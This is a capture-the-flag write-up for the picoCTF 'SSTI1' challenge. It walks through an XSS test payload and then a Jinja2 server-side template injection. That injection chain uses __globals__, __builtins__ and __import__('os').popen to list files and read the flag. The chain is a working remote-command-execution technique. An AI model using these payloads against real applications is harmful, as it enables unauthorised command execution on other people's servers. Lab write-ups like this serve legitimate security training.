# SSTI1

Platform: picoCTF  
Category: Web Exploitation  
Difficulty: Easy

---

## Description

The challenge provides a simple web page with a single input field.  
Whatever the user enters is displayed on the next page after clicking **Ok**.

The goal is to determine if this behavior can be abused to retrieve the flag.

---

## Given Files / Access

- URL: challenge instance provided by picoCTF
    
- Web page with a single input field.
    

---

## Initial Recon / Enumeration

After opening the website, the page simply echoes the user input.

Example:

```
Input: hello
Output: hello
```

I inspected the **Elements** and **Network** tabs in the browser developer tools, but nothing unusual appeared.

---

## Analysis

### Initial Guess: XSS

Since the input is reflected back on the page, I first suspected a **Cross-Site Scripting (XSS)** vulnerability.

Test payload:

```html
<image/src/onerror=prompt(8)>
```

This triggered a JavaScript prompt, which suggested that some form of injection might be possible. However, further XSS payloads did not lead to any useful result.

---

### Realization: SSTI

After looking again at the challenge title **SSTI1**, it became clear that the challenge likely involved **Server-Side Template Injection (SSTI)**.

SSTI occurs when user input is rendered inside a server-side template without proper sanitization.

To test this hypothesis, I used a basic SSTI payload:

```
{{3*3}}
```

Result:

```
9
```

This confirms that the input is being interpreted by a template engine.

---

### Identifying the Template Engine

To inspect the template environment, I tried:

```python
{{ self.__init__.__globals__ }}
```

This returned a large list of Python objects, indicating that the backend is using **Jinja2**.

To explore available built-in functions:

```python
{{ self.__init__.__globals__.__builtins__ }}
```

The output revealed several built-ins, including:

```python
__import__
```

This means we can import Python modules from within the template.

---

## Exploitation / Solution

Using the `__import__` function, we can import the **os** module and execute system commands.

### Step 1 – List files on the server

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
```

Output revealed a file named:

```
flag
```

---

### Step 2 – Read the flag file

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
```

This returned the flag.
